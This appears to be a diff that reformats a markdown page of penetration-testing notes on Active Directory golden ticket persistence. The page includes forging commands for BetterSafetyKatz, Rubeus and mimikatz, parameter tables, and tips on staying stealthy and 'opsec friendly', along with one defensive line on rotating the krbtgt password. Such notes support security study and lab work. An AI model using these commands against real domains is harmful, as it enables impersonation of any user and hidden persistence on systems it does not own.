@@ -1,9 +1,16 @@
 ---
-{"publish":true,"aliases":[],"created":"2025-02-23T23:53:09.698+05:30","modified":"2025-08-15T16:40:32.991+05:30","published":"2025-08-15T16:40:32.991+05:30","tags":["persistence"],"cssclasses":null}
+publish: true
+created: 2025-02-23T23:53:09.698+05:30
+modified: 2025-08-15T16:40:32.991+05:30
+published: 2025-08-15T16:40:32.991+05:30
+tags:
+  - persistence
+aliases: []
+cssclasses:
 ---
 
 - A golden ticket is signed and encrypted by the hash of the krbtgt account which makes it a valid TGT ticket.
-- This deals with abusing TGS-REQ 
+- This deals with abusing TGS-REQ
 - The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
 - As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
 
@@ -29,7 +36,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 | /user:Administrator  | Username for which the TGT is generated                                                                                                                |
 | /domain:domain.name  | FQDN                                                                                                                                                   |
 | /sid:S-1-XXXXX       | SID of the domain                                                                                                                                      |
-| /aes256:<aes256_key> | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent                                                                         |
+| /aes256:\<aes256\_key> | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent                                                                         |
 | /id:500 /groups:512  | Optional user RID (default 500) and Group (default 513 512 520 518 519)                                                                                |
 | /ptt                 | Injects the ticket in current shell - no need to save the ticket on disk                                                                               |
 | /ticket              | Saves the ticket to a file for later use                                                                                                               |
@@ -37,6 +44,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 | /endin:600           | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes                                            |
 | /renewmax:10080      | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 10080                                       |
 |                      |                                                                                                                                                        |
+
 #### Using Rubeus
 
 ```batch title:"Forge a golden ticket with attributes similar to a normal TGT"
@@ -44,9 +52,9 @@ C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_key> /sid:S-1-XXXXX /ldap /user:Ad
 ```
 
 - Generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve values:
-	- To retrieve flags for user specific in /user
-	- To retrieve `/groups`, `/pgid`, `/minpassage` and `/maxpassage`
-	- To retrieve `/netbios` of the current domain
+  - To retrieve flags for user specific in /user
+  - To retrieve `/groups`, `/pgid`, `/minpassage` and `/maxpassage`
+  - To retrieve `/netbios` of the current domain
 - If you have already enumerated the above values, manually specify as many as you can in the forging command, which is a bit more opsec friendly.
 
 ```batch title:"Forge the golden ticket"
@@ -68,8 +76,9 @@ C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_key> /user:Administrator /id:500 /
 | /logoncount:2453                          | Logon Count for the user (retrieved from the DC)                                     |
 | /netbios:domain                           | NetBIOS name of the domain (retrieved from the DC)                                   |
 | /dc:fqdn                                  | FQDN of the DC (retrieved from the DC)                                               |
-| /uac:NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD | UserAccountControl Flags (retrieved from the DC)                                     |
+| /uac:NORMAL\_ACCOUNT, DONT\_EXPIRE\_PASSWORD | UserAccountControl Flags (retrieved from the DC)                                     |
 | /ptt                                      | Inject in the current process                                                        |
+
 ```batch title:"Forge the golden ticket"
 mimikatz # kerberos::golden /krbtgt:ntlm_hash /user:Administrator /sid:check_Bloodhound /id:check_Bloodhound /domain:domain.name
 ```
